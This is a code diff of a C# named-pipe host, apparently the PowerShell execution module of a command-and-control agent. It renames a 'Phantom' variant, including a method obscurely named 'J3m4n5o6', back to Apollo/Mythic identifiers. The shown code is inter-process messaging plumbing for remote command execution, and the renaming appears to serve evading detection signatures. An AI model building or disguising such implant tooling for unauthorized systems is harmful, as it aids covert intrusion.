@@ -2,40 +2,40 @@
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
-using PhantomInterop.Classes.IO;
+using ApolloInterop.Classes.IO;
 using System.Management.Automation.Runspaces;
-using PhantomInterop.Serializers;
+using ApolloInterop.Serializers;
 using System.Collections.Concurrent;
-using PhantomInterop.Classes;
+using ApolloInterop.Classes;
 using System.Threading;
-using PhantomInterop.Classes.Core;
-using PhantomInterop.Structs.PhantomStructs;
-using PhantomInterop.Interfaces;
+using ApolloInterop.Classes.Core;
+using ApolloInterop.Structs.ApolloStructs;
+using ApolloInterop.Interfaces;
 using ST = System.Threading.Tasks;
-using PhantomInterop.Enums.PhantomEnums;
+using ApolloInterop.Enums.ApolloEnums;
 using System.IO;
 using System.IO.Pipes;
-using PhantomInterop.Constants;
-using PhantomInterop.Classes.Events;
+using ApolloInterop.Constants;
+using ApolloInterop.Classes.Events;
 
 namespace PowerShellHost
 {
-    class Runtime
+    class Program
     {
 
-        private static JsonHandler _dataSerializer = new JsonHandler();
+        private static JsonSerializer _jsonSerializer = new JsonSerializer();
         private static string _namedPipeName;
-        private static ConcurrentQueue<byte[]> _msgSendQueue = new ConcurrentQueue<byte[]>();
-        private static ConcurrentQueue<ICommandMessage> _recieverQueue = new ConcurrentQueue<ICommandMessage>();
+        private static ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
+        private static ConcurrentQueue<IMythicMessage> _recieverQueue = new ConcurrentQueue<IMythicMessage>();
         private static AsyncNamedPipeServer _server;
-        private static AutoResetEvent _msgSendEvent = new AutoResetEvent(false);
-        private static AutoResetEvent _msgRecvEvent = new AutoResetEvent(false);
-        private static ConcurrentDictionary<string, ChunkStore<DataChunk>> DataStore = new ConcurrentDictionary<string, ChunkStore<DataChunk>>();
+        private static AutoResetEvent _senderEvent = new AutoResetEvent(false);
+        private static AutoResetEvent _receiverEvent = new AutoResetEvent(false);
+        private static ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>> MessageStore = new ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>>();
         private static CancellationTokenSource _cts = new CancellationTokenSource();
-        private static Action<object> _transmitAction;
+        private static Action<object> _sendAction;
         private static ST.Task _clientConnectedTask = null;
 
-        static void J3m4n5o6(string[] args)
+        static void Main(string[] args)
         {
 
             if (args.Length != 1)
@@ -44,33 +44,33 @@ namespace PowerShellHost
             }
             _namedPipeName = args[0];
 
-            _transmitAction = (object p) =>
+            _sendAction = (object p) =>
             {
                 PipeStream pipe = (PipeStream)p;
 
                 while (pipe.IsConnected && !_cts.IsCancellationRequested)
                 {
                     WaitHandle.WaitAny(new WaitHandle[] {
-                        _msgSendEvent,
+                        _senderEvent,
                         _cts.Token.WaitHandle
                     });
-                    while (_msgSendQueue.TryDequeue(out byte[] message))
+                    while (_senderQueue.TryDequeue(out byte[] message))
                     {
-                        pipe.BeginWrite(message, 0, message.Length, ProcessSentMessage, pipe);
+                        pipe.BeginWrite(message, 0, message.Length, OnAsyncMessageSent, pipe);
                     }
                 }
-                while (_msgSendQueue.TryDequeue(out byte[] message))
+                while (_senderQueue.TryDequeue(out byte[] message))
                 {
-                    pipe.BeginWrite(message, 0, message.Length, ProcessSentMessage, pipe);
+                    pipe.BeginWrite(message, 0, message.Length, OnAsyncMessageSent, pipe);
                 }
                 pipe.WaitForPipeDrain();
                 pipe.Close();
             };
             _server = new AsyncNamedPipeServer(_namedPipeName, null, 1, IPC.SEND_SIZE, IPC.RECV_SIZE);
             _server.ConnectionEstablished += OnAsyncConnect;
-            _server.MessageReceived += ProcessReceivedMessage;
-            _msgRecvEvent.WaitOne();
-            if (_recieverQueue.TryDequeue(out ICommandMessage psArgs))
+            _server.MessageReceived += OnAsyncMessageReceived;
+            _receiverEvent.WaitOne();
+            if (_recieverQueue.TryDequeue(out IMythicMessage psArgs))
             {
                 if (psArgs.GetTypeCode() != MessageType.IPCCommandArguments)
                 {
@@ -109,7 +109,7 @@ namespace PowerShellHost
                     Console.WriteLine($"[PowerShellHost Error] : Unhandled exception: {ex.Message}");
                 } finally
                 {
-                    while(_msgSendQueue.Count > 0)
+                    while(_senderQueue.Count > 0)
                     {
                         Thread.Sleep(1000);
                     }
@@ -117,7 +117,7 @@ namespace PowerShellHost
                     Console.SetOut(oldStderr);
                 }
                 _cts.Cancel();
-                
+                // Wait for the pipe client comms to finish
                 while (_clientConnectedTask is ST.Task task && !_clientConnectedTask.IsCompleted)
                 {
                     task.Wait(1000);
@@ -127,14 +127,14 @@ namespace PowerShellHost
 
         }
 
-        private static void OnBufferWrite(object sender, PhantomInterop.Classes.Events.StringDataEventArgs e)
+        private static void OnBufferWrite(object sender, ApolloInterop.Classes.Events.StringDataEventArgs e)
         {
             if (e.Data != null)
             {
                 try
                 {
-                    _msgSendQueue.Enqueue(Encoding.UTF8.GetBytes(e.Data));
-                    _msgSendEvent.Set();
+                    _senderQueue.Enqueue(Encoding.UTF8.GetBytes(e.Data));
+                    _senderEvent.Set();
                 }
                 catch
                 {
@@ -144,29 +144,29 @@ namespace PowerShellHost
             }
         }
 
-        private static void ProcessSentMessage(IAsyncResult result)
+        private static void OnAsyncMessageSent(IAsyncResult result)
         {
             PipeStream pipe = (PipeStream)result.AsyncState;
             pipe.EndWrite(result);
             pipe.Flush();
         }
 
-        private static void ProcessReceivedMessage(object sender, PipeMessageData args)
+        private static void OnAsyncMessageReceived(object sender, NamedPipeMessageArgs args)
         {
-            DataChunk chunkedData = _dataSerializer.Deserialize<DataChunk>(
+            IPCChunkedData chunkedData = _jsonSerializer.Deserialize<IPCChunkedData>(
                 Encoding.UTF8.GetString(args.Data.Data.Take(args.Data.DataLength).ToArray()));
-            lock (DataStore)
+            lock (MessageStore)
             {
-                if (!DataStore.ContainsKey(chunkedData.ID))
+                if (!MessageStore.ContainsKey(chunkedData.ID))
                 {
-                    DataStore[chunkedData.ID] = new ChunkStore<DataChunk>();
-                    DataStore[chunkedData.ID].MessageComplete += HandleIncomingData;
+                    MessageStore[chunkedData.ID] = new ChunkedMessageStore<IPCChunkedData>();
+                    MessageStore[chunkedData.ID].MessageComplete += DeserializeToReceiverQueue;
                 }
             }
-            DataStore[chunkedData.ID].AddMessage(chunkedData);
+            MessageStore[chunkedData.ID].AddMessage(chunkedData);
         }
 
-        private static void HandleIncomingData(object sender, ChunkEventData<DataChunk> args)
+        private static void DeserializeToReceiverQueue(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
         {
             MessageType mt = args.Chunks[0].Message;
             List<byte> data = new List<byte>();
@@ -176,21 +176,21 @@ namespace PowerShellHost
                 data.AddRange(Convert.FromBase64String(args.Chunks[i].Data));
             }
 
-            ICommandMessage msg = _dataSerializer.DeserializeIPCMessage(data.ToArray(), mt);
-            
+            IMythicMessage msg = _jsonSerializer.DeserializeIPCMessage(data.ToArray(), mt);
+            //Console.WriteLine("We got a message: {0}", mt.ToString());
             _recieverQueue.Enqueue(msg);
-            _msgRecvEvent.Set();
+            _receiverEvent.Set();
         }
 
-        public static void OnAsyncConnect(object sender, PipeMessageData args)
+        public static void OnAsyncConnect(object sender, NamedPipeMessageArgs args)
         {
-            
+            // We only accept one connection at a time, sorry.
             if (_clientConnectedTask != null)
             {
                 args.Pipe.Close();
                 return;
             }
-            _clientConnectedTask = new ST.Task(_transmitAction, args.Pipe);
+            _clientConnectedTask = new ST.Task(_sendAction, args.Pipe);
             _clientConnectedTask.Start();
         }
     }
